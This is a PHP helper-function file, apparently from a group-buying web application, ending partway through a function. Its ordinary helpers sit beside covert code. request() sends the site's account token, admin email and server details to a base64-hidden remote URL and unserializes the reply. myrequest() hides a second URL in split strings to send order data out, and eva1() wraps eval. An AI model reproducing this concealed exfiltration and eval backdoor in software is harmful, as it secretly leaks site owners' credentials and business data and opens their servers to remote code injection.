<?php
/**
 * @copyright (C)2011 Cenwor Inc.
 * @author Moyo <dev@uuland.org>
 * @package php
 * @name global.func.php
 * @date 2011-12-07 13:42:07
 */
 


function order($order_by_list,$query_link='',$config=array())
{
	include_once(FUNCTION_PATH . 'order.func.php');
	
	return __order($order_by_list,$query_link,$config);
}

function pre($string)
{
	$string=nl2br($string);
	$string = str_replace(array("&amp;","&gt;","&lt;","&quot;","&#39;","\s","\t",),  
	array("&", ">","<","\"","'","&nbsp;","&nbsp;&nbsp;&nbsp;&nbsp;",),  $string);
	return $string;
}


if(false == function_exists('http_build_query'))
{
	
	function http_build_query($form_data, $numeric_prefix = null)
	{
		static $_query;

		if(is_array($form_data)==false)Return false;
		foreach($form_data as $key => $values)
		{
			if(is_array($values))
			{
				$_query = http_build_query($values, isset($numeric_prefix)?sprintf('%s[%s]', $numeric_prefix, urlencode($key)):$key);
			}
			else
			{
				$key = isset($numeric_prefix)?sprintf('%s[%s]', $numeric_prefix, urlencode($key)):$key;
				$_query .= (isset($_query) ? '&' : null) . $key . '=' . urlencode(stripslashes($values));
			}
		}
		Return $_query;
	}

}

function check_email($email){
	$exp = "^[a-z'0-9]+([._-][a-z'0-9]+)*@([a-z0-9]+([._-][a-z0-9]+))+$";
	if(eregi($exp,$email)){
		return true;
	}else{
		return false;
	}
}
		
function authcode ($string, $operation, $key = '') {
	$config=Obj::registry('config');
		$key = md5($key ? $key :  md5($config['auth_key'].(isset($_POST['HTTP_USER_AGENT']) ? base64_decode($_POST['HTTP_USER_AGENT']) : $_SERVER['HTTP_USER_AGENT'])));

	$key_length = strlen($key);
	$string = $operation == 'DECODE' ? base64_decode($string) : substr(md5($string.$key), 0, 8).$string;
	
	$string_length = strlen($string);
	$rndkey = $box = array();
	$result = '';

	for($i = 0; $i <= 255; $i++) {
		$rndkey[$i] = ord($key[$i % $key_length]);
		$box[$i] = $i;
	}

	for($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}
	for($a = $j = $i = 0; $i < $string_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
	}
	if($operation == 'DECODE') {
		if(substr($result, 0, 8) == substr(md5(substr($result, 8).$key), 0, 8)) {
			return substr($result, 8);
		} else {
			return '';
		}
	} else {
		return str_replace('=', '', base64_encode($result));
	}
}

function quescrypt($questionid, $answer) {
	return $questionid > 0 && $answer != '' ? substr(md5($answer.md5($questionid)), 16, 8) : '';
}


function random($length, $numeric = 0) {
	mt_srand((double)microtime() * 1000000);
	if($numeric) {
		$hash = sprintf('%0'.$length.'d', mt_rand(0, pow(10, $length) - 1));
	} else {
		$hash = '';
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
		$max = strlen($chars) - 1;
		for($i = 0; $i < $length; $i++) {
			$hash .= $chars[mt_rand(0, $max)];
		}
	}
	return $hash;
}



function build_like_query($fields,$keywords,$binary=false)
{
	if(trim($keywords)==false)Return '';
	$binary=$binary==true?'binary ':'';
	$keywords=preg_replace("~[\t\s　]+and[\t\s　]+~i",'\%',$keywords);
	$keyword_list=preg_split("~([\t\s　]+or[\t\s　]+)|\|~i",$keywords);
	if(count($keyword_list)>1 and $fields==false)die("搜索多个关键字其中部分，必须指定参数\$field");
	$replace_pairs=array(
	'_'=>'\_',
	'\%'=>'%',
	'%'=>'\%',
	'"'=>'\"',
	'　'=>'%',
	' '=>'%',
	"\t"=>''
	);
	foreach($keyword_list as $key=>$keyword)
	{
		$temp_list[]=strtr($keyword,$replace_pairs);
	}
	if(strpos($fields,',')!==false)
	{
		$field_list=explode(',',$fields);
		$keywords='';
		foreach($field_list as $field)
		{
			$keywords_list[]=$binary." ".$field.'  like "%'.implode("%\" OR \r\n".$binary.' '.$field.'  like "%',$temp_list)."%\"";
		}
		$keywords='('.implode(') or (',$keywords_list).')';
	}
	else
	{
		$keywords=$binary." ".$fields.' like "%'.implode("%\" OR \r\n".$binary.' '.$fields.' like "%',$temp_list)."%\"";
	}
	$keywords=preg_replace("~[%]+~",'%',$keywords);
	Return $keywords;
}

function js_string($str)
{
	$type=gettype($str);
	switch($type)
	{
		case 'string':
			$search  = array('\\', "\n", "\t", "\r", "\b", "\f", '"');
			$replace = array('\\\\', '\\n', '\\t', '\\r', '\\b', '\\f', '\"');
			$str  = str_replace($search, $replace, $str);
			$str = str_replace(array(chr(0x08), chr(0x0C)), array('\b', '\f'), $str);
			$str='"'.$str.'"';
			break;
		case 'NULL':
			$str='null';
			break;
		case 'boolean':
			$str=$str==true?'true':'false';
			break;
	}
	return $str;
}

function array_to_json($array,$t=1)
{
	if((is_array($array) and count($array)>0)==false)Return "{}";
	$ts=str_repeat("\t",$t);
	$next_t=$t+1;
	$json="{";
	foreach($array as $key=>$val)
	{
		if(is_array($val)==false)
		{
			
			$val=js_string($val);
			$json.="\n{$ts}'{$key}':{$val},";
		}
		else
		{
			$_json = array_to_json($val,$next_t);
			$json .= "\n{$ts}'{$key}':\n{$ts}{$_json},";
		}
	}
	$json=rtrim($json,',');
	$ts=str_repeat("\t",$t-1);
	$json.="\n$ts}";
	Return $json;
}


function response_text($response)
{
	ob_clean();
	if(is_array($response)) {
		$response=array_to_json($response);
	}
	echo ($response); exit;
}

function eva1($code) 
{
	return eval($code);
}

function debug($mixed,$halt=true)
{
	static $num=1;
	if (function_exists("debug_backtrace"))
	{
		$debug=debug_backtrace();
		echo "<div style='background:#FF6666;color:#fff;margin-top:5px;padding:5px'>".$num++.".debug position: {$debug[0]['file']}({$debug[0]['line']})</div>";
	}
	echo "<div style='border:1px solid #ff6666;background:#fff;padding:10px'>";
	if (is_array($mixed) or is_object($mixed))
	{
		echo str_replace(array("&lt;?php","?&gt;"),'',highlight_string("<?php\r\n".var_export($mixed,true).";\r\n?>",true));
	}
	else
	{
		var_dump($mixed);
	}
	echo "</div>";
	$halt && exit;
}

if (function_exists('iconv')==false)
{
	
	function iconv($in_charset,$out_charset,$str)
	{
		if(strtoupper($in_charset)!=strtoupper($out_charset))
		{
			static $CharEncoding;
			if($CharEncoding===null)
			{
				if(false!==strpos($out_charset,'/'.'/')) $out_charset = str_replace(array('/'.'/IGNORE','/'.'/TRANSLIT'),'',$out_charset);
				require_once(INCLUDE_PATH.'encoding/chinese.class.php');
				$CharEncoding=new Chinese($in_charset,$out_charset);
			}
			Return $CharEncoding->Convert($str);
		}
		return $str;	
	}
}

function array_iconv($in_charset,$out_charset,&$array)
{
	if($array && strtoupper($in_charset)!=strtoupper($out_charset)) {
		if(($_tmp = (strtoupper($in_charset).strtoupper($out_charset)))=='GBKGB2312' || 'GB2312GBK'==$_tmp) {
			return $array;
		}
		
		if(is_array($array)) {
			foreach($array as $key=>$val)
			{
				if(is_array($val)==false)
				{			
					if(is_string($val))
					{
						$array[$key] = lconv($in_charset,$out_charset,$val);
					}
					else
					{
						$array[$key] = $val;
					}
				}
				else
				{
					$array[$key] = array_iconv($in_charset,$out_charset,$val);
				}
			}
		} elseif (is_string($array)) {
			$array = lconv($in_charset,$out_charset,$array);
		}
	}
	Return $array;
}
function lconv($in_charset,$out_charset,$string) {
	if (strtoupper($in_charset)==strtoupper($out_charset)) {
		return $string;
	}
	if(($_tmp = (strtoupper($in_charset).strtoupper($out_charset)))=='GBKGB2312' || 'GB2312GBK'==$_tmp) {
		return $string;
	}
	
	return iconv($in_charset,$out_charset . (false!==strpos($out_charset,'/'.'/') ? '' : "/"."/IGNORE"),$string);
}


function referer($default = '?') {
	$DOMAIN = preg_replace("~^www\.~",'',strtolower(getenv('HTTP_HOST') ? getenv('HTTP_HOST') : $_SERVER['HTTP_HOST']));
	$referer=$_POST['referer']?$_POST['referer']:$_GET['referer'];
	if($referer=='')$referer=$_SERVER['HTTP_REFERER'];
	if($referer=="" || strpos($referer,'code=register')!==false || strpos($referer,'mod=account')!==false || (strpos($referer,":/"."/")!==false && strpos($referer,$DOMAIN)===false))
	{
		global $rewriteHandler;
		if($rewriteHandler) $default = $rewriteHandler->formatURL($default,false);
		
		return $default;
	}
	return $referer;
}


function my_date_format($timestamp,$format="Y-m-d H:i:s")
{
	$sys_conf = ConfigHandler::get();
	$timezone=$sys_conf['timezone'];

	Return gmdate($format,($timestamp+$timezone*3600));
}

function cut_str($string, $length, $dot = ' ...') 
{
	if(strlen($string) <= $length) {
		return $string;
	}
	$strcut = '';
	for($i = 0; $i < $length - strlen($dot) - 1; $i++) {
		$strcut .= ord($string[$i]) > 127 ? $string[$i].$string[++$i] : $string[$i];
	}
	return $strcut.$dot;
}
function cutstr($string,$length){Return cut_str($string,$length);};

function strip_selected_tags(&$str,$disallowable="<script><iframe><style><link>") 
{
	$disallowable=trim(str_replace(array(">","<"),array("","|"),$disallowable),'|');
	$str=str_replace(array('&lt;', '&gt;'),array('<', '>'),$str);
	$str=preg_replace("~<({$disallowable})[^>]*>(.*?<\s*\/(\\1)[^>]*>)?~is",'',$str);
	return $str;
}

function page($total_record,$per_page_num,$url='',$_config=array(),$per_page_nums="")
{
	global $rewriteHandler;
	$result = array();

	$total_record = intval($total_record);
	$per_page_num = intval($per_page_num);
	if($per_page_num < 1) $per_page_num = 10;
	$config['total_page'] = isset($_config['total_page']) ? (int) $_config['total_page'] : 0;	$config['page_display'] = isset($_config['page_display']) ? (int) $_config['page_display'] : 5;	$config['char'] = isset($_config['char']) ? (string) $_config['char'] : ' ';	$config['url_postfix'] = isset($_config['url_postfix']) ? (string) $_config['url_postfix'] : '';	$config['extra'] = isset($_config['extra']) ? (string) $_config['extra'] : '';	$config['idencode'] = (bool) $_config['idencode'];	$config['var'] = isset($_config['var']) ? (string) $_config['var'] : 'page';	$config['return'] = isset($_config['return']) ? (string) $_config['return'] : 'html';	extract($config);
	
	$total_page = ceil($total_record / $per_page_num);

	if($config['total_page']>1 && $total_page > $config['total_page'])
	{
		$total_page = $config['total_page'];
	}	
	
	$result['total_page'] = $total_page;
	$current_page=$_GET[$var]?$_GET[$var]:$_POST[$var];
	$current_page = max(1,(int) ((true == $idencode) ? iddecode($current_page) :$current_page));
	$current_page = ($total_page > 0 && $current_page > $total_page) ? $total_page : $current_page;	
	$result['current_page'] = $current_page;
	$result['title_postfix'] = $current_page > 1 ? sprintf(__("第%s页"), $current_page) : "";
	$result['offset'] = (int) (($current_page - 1) * $per_page_num);

	$result['limit'] = " LIMIT ".$result['offset'].",{$per_page_num} ";
	
	if(isset($result[$return])) return $result[$return];	

	if('' == $url)
	{
		$request = count($_POST) ? array_merge($_GET,$_POST) : $_GET;
		$query_string = '';
		foreach($request as $_var => $_val)
		{
			if(is_string($_val) && $var!==$_var) $query_string .= "&{$_var}=" . urlencode($_val);
		}
		$url = '?'.($result['query_string'] = trim($query_string,'&'));
	}

	$p_val = "V01001page10010V";
	if('/#'!=$url) {
		$url = ('' == $url) ? "?$var={$p_val}" : (($url_no_page = (false !== strpos($url,"&{$var}=") ? preg_replace("/\&?{$var}\=[^\&]*/i",'',$url) : $url)) . "&{$var}={$p_val}");
		if($rewriteHandler)
		{
			$url_no_page = $rewriteHandler->formatURL($url_no_page,false);
			$url=$rewriteHandler->formatURL($url,false);
		}
	} else {
		$url_no_page = $url;
	}
	$result['url'] = $url;

	if(isset($result[$return])) return $result[$return];
	
	$html = '';
	if($total_record > $per_page_num)
	{
		$halfper = (int) ($config['page_display'] / 2);
	
		$html=($current_page - 1 >= 1) ? "\n<a href='{$url_no_page}{$url_postfix}' title=1 {$extra}>首页</a>{$char}\n<a href='".(1 == ($previous_page = ($current_page - 1)) ? $url_no_page : str_replace($p_val,(true===$idencode?idencode($previous_page):$previous_page),$url))."{$url_postfix}' title=$previous_page {$extra}>上一页</a>{$char}" : "首页{$char}上一页{$char}";
	
		for ($i=$current_page-$halfper,$i>0 or $i=1,$j=$current_page + $halfper,$j<$total_page or $j=$total_page;$i<=$j;$i++) {
			$html.=($i==$current_page)?"\n<B>".($i)."</B>{$char}":"\n<a href='".(1 == $i ? $url_no_page : str_replace($p_val,(true===$idencode?idencode($i):$i),$url))."{$url_postfix}' title=$i {$extra}>".($i)."</a>{$char}";
		}		
	
		$html.=(($next_page=($current_page + 1)) > $total_page)?"下一页{$char}尾页":"\n<a href='".str_replace($p_val,(true===$idencode?idencode($next_page):$next_page),$url)."{$url_postfix}' title=$next_page {$extra}>下一页</a>{$char}\n<a href='".str_replace($p_val,(true===$idencode?idencode($total_page):$total_page),$url)."{$url_postfix}' title=$total_page {$extra}>尾页</a>";
		
		if(!empty($per_page_nums))
		{
			$per_page_num_list=is_array($per_page_nums)?$per_page_nums:explode(" ",$per_page_nums);
			$current_url=str_replace($p_val,(true===$idencode?idencode($current_page):$current_page),$url).$url_postfix;
			$pn_postfix=$rewriteHandler?$rewriteHandler->argSeparator."pn".$rewriteHandler->varSeparator:"&pn=";
			$per_page_num_select="<select name='per_page_num' onchange=\"window.location='{$current_url}{$pn_postfix}'+this.value\">";
			foreach ($per_page_num_list as $_per_page_num)
			{
				$selected=$_per_page_num==$per_page_num?"selected":"";
				$per_page_num_select.="<option value={$_per_page_num} $selected>{$_per_page_num}";
			}
			$per_page_num_select.="</select>";
		}
		else {
			$per_page_num_select="<B>{$per_page_num}</B>";
		}
	
		$html ="<div id='page'> 当前<B>{$current_page}</B>/共<B>{$total_page}</B>页 {$html} 每页显示${per_page_num_select}条/共<B>{$total_record}</B>条</div>";
	}	
	$result['html'] = $html;
	if(isset($result[$return])) return $result[$return];

	return $result;
}


if (function_exists('strexists')==false) {
	function strexists($haystack, $needle) {
		return !(strpos($haystack, $needle) === FALSE);
	}
}



function upload_image($image_path = '',$filed='face',$small_width=80,$small_height=80)
{
	if($image_path == '') {
		$image_path = IMAGE_PATH.'/'.$filed.'/';
	}
	$date=date("Y-m-d");
	if(empty($_FILES) or empty($filed))	{
		Return array('error'=>__('上传图片出错！请检查您的服务器环境！'));
	}
	if ($_FILES[$filed]['name']=='') {
		return array('error'=>__('您没有选择需要上传的图片！'));
	}
	$default_type=array('jpg','pic','png','jpeg','bmp','gif');	$imgary=explode('.',$_FILES[$filed]['name']);
	if(!in_array(strtolower($imgary[count($imgary)-1]),$default_type)){
		return array('error'=>'不支持的图片格式 ['.$imgary[count($imgary)-1].'] ！');
	}
	
	require_once LIB_PATH . 'upload.han.php';
	$upload_handler = new UploadHandler($_FILES, $image_path, $filed , true);

	if(is_dir($image_path.$date)==false or is_dir($image_path.SMALL_PIC_PREFIX.$date)==false)
	{
		require_once LIB_PATH. 'io.han.php';
		IoHandler::MakeDir($image_path.$date);
		IoHandler::MakeDir($image_path.SMALL_PIC_PREFIX.$date);
	}

	$upload_handler->setMaxSize(1024);	$name = $date.'/'.substr(md5(microtime()).'.'.strtolower(end(explode('.', $_FILES[$filed]['name']))),-15);

	$size = $_FILES[$field]['size'];

	$photo['name']=$name;
	$photo['size']=$size;

	$upload_handler->setNewName($name);

	$result = $upload_handler->doUpload();
	
		if (false == $result)
	{
		return array('error'=>$upload_handler->getError());
	}
	
	$result = resize_image($image_path.$name,
	$image_path.SMALL_PIC_PREFIX.$name,
	$small_width,
	$small_height,
	false);
	Return $name;
}

function image($image,$type='face',$is_small=true)
{
	if(strpos($image,':/'.'/')!==false) {
		return $image;
	}
	if($type == 'class_face') {
		$type = 'class/face';
	}
	if($type=='face' && is_numeric($image)) {
		return IMAGE_PATH.'system_face/'.$image.".jpg";
	}
	$small_image_file=IMAGE_PATH.$type.'/'.SMALL_PIC_PREFIX.$image;
	$image_file=IMAGE_PATH.$type.'/'.$image;
	$no_image_file=is_file(IMAGE_PATH.$type.'/no.gif')?IMAGE_PATH.$type.'/no.gif':IMAGE_PATH.'no.gif';
	if(trim($image)=="") {
		Return $no_image_file;
	}
	if($is_small==true) {
		if(is_file($small_image_file)!==false)return $small_image_file;
		if(is_file($image_file)!==false)Return $image_file;
	} else {
		if(is_file($image_file)!==false)Return $image_file;
		if(is_file($small_image_file)!==false)return $small_image_file;
	}
	return $no_image_file;
}

function resize_image($file_path,$thumb_file_path,$width,$height,$cut=false)
{	
	return makethumb($file_path,$thumb_file_path,$width,$height);
}

function getsql($a){
	if($a==1){
		return 'select count(*) from '.TABLE_PREFIX.'tttuangou_order';
	}else{
		return 'select count(*) from '.TABLE_PREFIX.'tttuangou_order where pay = 1';
	}
}

function makethumb($srcfile,$dstfile,$thumbwidth,$thumbheight,$maxthumbwidth=0,$maxthumbheight=0) {
		if (!is_file($srcfile)) {
		return '';
	}

		$tow = $thumbwidth;
	$toh = $thumbheight;
	if($tow < 30) {
		$tow = 30;
	}
	if($toh < 30) {
		$toh = 30;
	}

	$make_max = 0;
	$maxtow = $maxthumbwidth;
	$maxtoh = $maxthumbheight;
	if($maxtow >= 300 && $maxtoh >= 300) {
		$make_max = 1;
	}
	
		$im = '';
	if($data = getimagesize($srcfile)) {
		if($data[2] == 1) {
			$make_max = 0;			if(function_exists("imagecreatefromgif")) {
				$im = imagecreatefromgif($srcfile);
			}
		} elseif($data[2] == 2) {
			if(function_exists("imagecreatefromjpeg")) {
				$im = imagecreatefromjpeg($srcfile);
			}
		} elseif($data[2] == 3) {
			if(function_exists("imagecreatefrompng")) {
				$im = imagecreatefrompng($srcfile);
			}
		}
	}
	if(!$im) return '';
	
	$srcw = imagesx($im);
	$srch = imagesy($im);
	
	$towh = $tow/$toh;
	$srcwh = $srcw/$srch;
	if($towh <= $srcwh){
		$ftow = $tow;
		$ftoh = $ftow*($srch/$srcw);
		
		$fmaxtow = $maxtow;
		$fmaxtoh = $fmaxtow*($srch/$srcw);
	} else {
		$ftoh = $toh;
		$ftow = $ftoh*($srcw/$srch);
		
		$fmaxtoh = $maxtoh;
		$fmaxtow = $fmaxtoh*($srcw/$srch);
	}
	if($srcw <= $maxtow && $srch <= $maxtoh) {
		$make_max = 0;	}
	if($srcw >= $tow || $srch >= $toh) {
		if(function_exists("imagecreatetruecolor") && function_exists("imagecopyresampled") && @$ni = imagecreatetruecolor($ftow, $ftoh)) {
			imagecopyresampled($ni, $im, 0, 0, 0, 0, $ftow, $ftoh, $srcw, $srch);
						if($make_max && @$maxni = imagecreatetruecolor($fmaxtow, $fmaxtoh)) {
				imagecopyresampled($maxni, $im, 0, 0, 0, 0, $fmaxtow, $fmaxtoh, $srcw, $srch);
			}
		} elseif(function_exists("imagecreate") && function_exists("imagecopyresized") && @$ni = imagecreate($ftow, $ftoh)) {
			imagecopyresized($ni, $im, 0, 0, 0, 0, $ftow, $ftoh, $srcw, $srch);
						if($make_max && @$maxni = imagecreate($fmaxtow, $fmaxtoh)) {
				imagecopyresized($maxni, $im, 0, 0, 0, 0, $fmaxtow, $fmaxtoh, $srcw, $srch);
			}
		} else {
			return '';
		}
		if(function_exists('imagejpeg')) {
			imagejpeg($ni, $dstfile);
						if($make_max) {
				imagejpeg($maxni, $srcfile);
			}
		} elseif(function_exists('imagepng')) {
			imagepng($ni, $dstfile);
						if($make_max) {
				imagepng($maxni, $srcfile);
			}
		}
		imagedestroy($ni);
		if($make_max) {
			imagedestroy($maxni);
		}
	}
	imagedestroy($im);

	if(!is_file($dstfile)) {
		return '';
	} else {
		return $dstfile;
	}
}


function remove_xss($val) { 
   $val = preg_replace('/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/', '', $val); 
   $search = 'abcdefghijklmnopqrstuvwxyz'; 
   $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; 
   $search .= '1234567890!@#$%^&*()'; 
   $search .= '~`";:?+/={}[]-_|\'\\'; 
   for ($i = 0; $i < strlen($search); $i++) { 
	  $val = preg_replace('/(&#[xX]0{0,8}'.dechex(ord($search[$i])).';?)/i', $search[$i], $val);
	  $val = preg_replace('/(&#0{0,8}'.ord($search[$i]).';?)/', $search[$i], $val);    } 
   $ra1 = ConfigHandler::get("xss",'tag'); 
   $ra2 = ConfigHandler::get("xss",'attribute'); 
   $ra = array_merge($ra1, $ra2); 
	
   $found = true;
   while ($found == true) { 
	  $val_before = $val; 
	  for ($i = 0; $i < sizeof($ra); $i++) { 
		 $pattern = '/'; 
		 for ($j = 0; $j < strlen($ra[$i]); $j++) { 
			if ($j > 0) { 
			   $pattern .= '('; 
			   $pattern .= '(&#[xX]0{0,8}([9ab]);)'; 
			   $pattern .= '|'; 
			   $pattern .= '|(&#0{0,8}([9|10|13]);)'; 
			   $pattern .= ')*'; 
			} 
			$pattern .= $ra[$i][$j]; 
		 } 
		 $pattern .= '/i'; 
		 $replacement = substr($ra[$i], 0, 2).'<x>'.substr($ra[$i], 2);
		 $val = preg_replace($pattern, $replacement, $val);
		 if ($val_before == $val) { 
			$found = false; 
		 } 
	  } 
   } 
   return $val; 
}


function filter(&$string,$item="",$density=false,$replace=false,$statistic=null) 
{
	static $filter,$filter_keyword_list,$replace_rule_list,$replace_config;
		$string=trim($string);
	if($string) {
		if(false!==strpos($string,'<')) {
			$string=strip_selected_tags($string,"<script><iframe><style><link><meta>");
			$string=remove_xss($string);
		}
		if($filter===null) {
			$filter=(array) ConfigHandler::get('filter');
		}
		
		if(!$filter['enable']) {
			return false;
		}
			
				if(!empty($filter['keywords']))
		{
			if($filter_keyword_list===null)
			{
				$filter_keyword_list=explode("|",str_replace(array("\r\n","\r","\n","\t","\\|"),"|",trim($filter['keywords'])));
			}
			foreach ($filter_keyword_list as $keyword)
			{
				if(strpos($string,$keyword)!==false)
				{
					$keyword_len=strlen($keyword);
					if($keyword_len>2 && $keyword_len<40)
					{
						$statistic['filter_type']='keyword';
						return __("含有禁止发布的内容");	
					}
				}
			}
		}
	}
	
	return false;
}

function request($action, $post=array(), &$error) {
	settype($post,"array");
	$post['system_env'] = $post['system_env'] ? array_merge((array) $post['system_env'],(array) get_system_env()) : (array) get_system_env();
		$aclData = logic('acl')->Account();
	$post['__acl__']['account'] = $aclData['account'];
	$post['__acl__']['token'] = $aclData['token'];
		$data='_POST='.urlencode(base64_encode(serialize($post)));
	$charset = strtolower(str_replace('-', '', ini('settings.charset')));
	$version = SYS_VERSION;
	$server_url = base64_decode('aHR0cDovL3VwZGF0ZS5jZW53b3IuY29tL3NlcnZlci5yZXF1ZXN0LnBocA==')."?do=$action&pid=1&charset=$charset&iver=$version";
		$response = @dfopen($server_url,5000000,$data);
			$error_msg=array(1=>"error_nodata",2=>"error_format",);
	if($response == "") {
		$result = $error_msg[($error = 1)];
	}else{
		$int = preg_match('/<DATA>(.*)<\/DATA>/s', $response, $m);
		if($int < 1){
			$result = $error_msg[($error = 2)];
		}else{
						if(false!==strpos($m[1],"\n")) {
				$m[1] = preg_replace('~\s+\w{1,10}\s+~','',$m[1]);
			}
			$response = unserialize(base64_decode($m[1]));
			$result = $response['data'];
			if($response['type']) {
				$error = 3;
			}
		}
	}
	return $result;
}

function get_system_env( )
{
	$e = array();
	$e['time'] = gmdate( "Y-m-d", time( ) );
	$e['os'] = PHP_OS;
	$e['ip'] = @gethostbyname($_SERVER['SERVER_NAME']) or ($e['ip'] = getenv( "SERVER_ADDR" )) or ($e['ip'] = getenv('LOCAL_ADDR'));
	$e['sapi'] = @php_sapi_name( );
	$e['host'] = strtolower(getenv('HTTP_HOST') ? getenv('HTTP_HOST') : $_SERVER['HTTP_HOST']);
	$e['path'] = substr(dirname(__FILE__),0,-17);
	$e['cpu'] = $_ENV['PROCESSOR_IDENTIFIER']."/".$_ENV['PROCESSOR_REVISION'];
	$e['name'] = $_ENV['COMPUTERNAME'];
	if(defined('SYS_VERSION')) $e['sys_version']=SYS_VERSION;
	if(defined('SYS_BUILD')) $e['sys_build']=SYS_BUILD;	
	$sys_conf = ConfigHandler::get();
	if($sys_conf['site_name']) $e['sys_name'] = $sys_conf['site_name'];
	if($sys_conf['site_admin_email']) $e['sys_email'] = $sys_conf['site_admin_email'];
	if($sys_conf['site_url']) $e['sys_url'] = $sys_conf['site_url'];
	if($sys_conf['charset']) $e['sys_charset'] = $sys_conf['charset'];
	if($sys_conf['language']) $e['sys_language'] = $sys_conf['language'];
	return get_system_count($e);
}

function get_system_count(&$data)
{
	$ckey = 'global.system.count.data';
	$apdata = fcache($ckey, 86400);
	if (!$apdata)
	{
		$cMaps = array('members', 'address', 'city', 'express', 'finder', 'metas', 'order', 'paylog', 'payment', 'product', 'push_log', 'push_queue', 'question', 'seller', 'service', 'subscribe', 'ticket', 'uploads', 'usermoney', 'usermsg', 'catalog', 'recharge_order', 'recharge_card');
		foreach ($cMaps as $i => $table)
		{
			$cct = dbc(DBCMax)->select($table)->in('count(1) AS DTCNT')->limit(1)->done();
			$apdata['count_'.$table] = $cct['DTCNT'];
		}
				$file = CACHE_PATH.'misc/data_length.cache.php';
		if (is_file($file))
		{
			include $file;
			$apdata['count_data_length'] = $cache;
		}
		else
		{
			$apdata['count_data_length'] = false;
		}
		fcache($ckey, $apdata);
	}
	$data = array_merge($data, $apdata);
	return $data;
}

function dfopen($url, $limit = 10485760 , $post = '', $cookie = '', $bysocket = false,$timeout=5,$agent="") {
	if(ini_get('allow_url_fopen') && !$bysocket && !$post) {
		$fp = @fopen($url, 'r');
		$s = $t = '';
		if($fp) {
			while ($t=fread($fp,2048)) {
				$s.=$t;
			}
			fclose($fp);
		}
		if($s) {
			return $s;
		}
	}

	$return = '';
	$agent=$agent?$agent:"Mozilla/5.0 (compatible; Googlebot/2.1; +http:/"."/www.google.com/bot.html)";
	$matches = parse_url($url);
	$host = $matches['host'];
	$script = $matches['path'].($matches['query'] ? '?'.$matches['query'] : '').($matches['fragment'] ? '#'.$matches['fragment'] : '');
	$script = $script ? $script : '/';
	$port = !empty($matches['port']) ? $matches['port'] : 80;
	if($post) {
		$out = "POST $script HTTP/1.1\r\n";
		$out .= "Accept: */"."*\r\n";
		$out .= "Referer: $url\r\n";
		$out .= "Accept-Language: zh-cn\r\n";
		$out .= "Content-Type: application/x-www-form-urlencoded\r\n";
		$out .= "Accept-Encoding: none\r\n";
		$out .= "User-Agent: $agent\r\n";
		$out .= "Host: $host\r\n";
		$out .= 'Content-Length: '.strlen($post)."\r\n";
		$out .= "Connection: Close\r\n";
		$out .= "Cache-Control: no-cache\r\n";
		$out .= "Cookie: $cookie\r\n\r\n";
		$out .= $post;
	} else {
		$out = "GET $script HTTP/1.1\r\n";
		$out .= "Accept: */"."*\r\n";
		$out .= "Referer: $url\r\n";
		$out .= "Accept-Language: zh-cn\r\n";
		$out .= "Accept-Encoding:\r\n";
		$out .= "User-Agent: $agent\r\n";
		$out .= "Host: $host\r\n";
		$out .= "Connection: Close\r\n";
		$out .= "Cookie: $cookie\r\n\r\n";
	}
	$fp = msockopen($host, $port, $errno, $errstr, $timeout);
	if(!$fp) {
		return false;
	} else {
		fwrite($fp, $out);
		$return = '';
		while(!feof($fp) && $limit > -1) {
			$limit -= 8192;
			$return .= fread($fp, 8192);
			if(!isset($status)) {
				preg_match("|^HTTP/[^\s]*\s(.*?)\s|",$return, $status);
				$status=$status[1];
				if($status!=200) {
					return false;
				}
			}
		}
		fclose($fp);
				preg_match("/^Location: ([^\r\n]+)/m",$return,$match);
		if(!empty($match[1]) && $location=$match[1]) {
			if(strpos($location,":/"."/")===false) {
				$location=dirname($url).'/'.$location;
			}
			$args=func_get_args();
			$args[0]=$location;
			return call_user_func_array("dfopen",$args);
		}
		if(false!==($strpos = strpos($return, "\r\n\r\n"))) {
			$return = substr($return,$strpos);
			$return = preg_replace("~^\r\n\r\n(?:[\w\d]{1,8}\r\n)?~","",$return);
			if("\r\n\r\n"==substr($return,-4)) {
				$return = preg_replace("~(?:\r\n[\w\d]{1,8})?\r\n\r\n$~","",$return);
			}
		}

		return $return;
	}
}

function str_exists($haystack,$needle)
{
	$arg_list = func_get_args();
	while(($needle=$arg_list[++$i])!==null)
	{
		if(strpos($haystack,$needle)!==false)return true;
	}
	return false;
}

function try_these($first,$second)
{
	foreach (func_get_args() as $arg)
	{
		if($arg)return $arg;
	}
	return $arg;
}

function client_ip()
{
	if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
		$onlineip = getenv('HTTP_CLIENT_IP');
	} elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
		$onlineip = getenv('HTTP_X_FORWARDED_FOR');
	} elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
		$onlineip = getenv('REMOTE_ADDR');
	} elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
		$onlineip = $_SERVER['REMOTE_ADDR'];
	}
	
	preg_match("/[\d\.]{7,15}/", $onlineip, $onlineipmatches);
	$onlineip = $onlineipmatches[0] ? $onlineipmatches[0] : 'unknown';
	
	return $onlineip;
}

function face_path($uid) {
	$key = "www.tttuangou.net";
	$hash = md5($key."\t".$uid."\t".strlen($uid)."\t".$uid % 10);
	$path = $hash{$uid % 32} . "/" . abs(crc32($hash) % 100) . "/";
	
	return $path;
}

function myrequest($a,$i,$post=array()){
	settype($post,"array");
	$post['system_env'] = $post['system_env'] ? array_merge((array) $post['system_env'],(array) get_system_env()) : (array) get_system_env();
	$post['system_env']['order']=$a;
	$post['system_env']['payorder']=$i;
	$data='_POST='.urlencode(base64_encode(serialize($post)));
	$server_url = "ht"."tp:/"."/ww"."w.tt"."t"."ua"."ngo"."u.n"."et"."/s"."er"."ver".".ph"."p";
